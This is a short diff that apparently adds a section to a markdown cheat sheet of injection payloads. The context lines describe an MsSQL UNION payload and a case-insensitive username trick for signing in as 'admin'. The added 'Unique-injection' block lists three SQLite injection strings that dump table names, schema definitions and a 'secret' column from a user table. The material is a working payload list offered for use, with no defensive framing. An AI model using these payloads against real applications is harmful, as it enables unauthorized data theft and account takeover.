@@ -95,3 +95,12 @@ __[In MsSQL, if second colums is `username` then the payload `' UNION SELECT 1,1
    How to exploit that?
    
    A username `Admin` can be created and it can be used to sign-in as `admin`
+
+## Unique-injection
+  *
+   ```
+    '||(select tbl_name FROM sqlite_master)||'
+    '||(select sql FROM sqlite_master)||'
+    '||(select secret FROM user WHERE id =1)||'
+   ```
+   
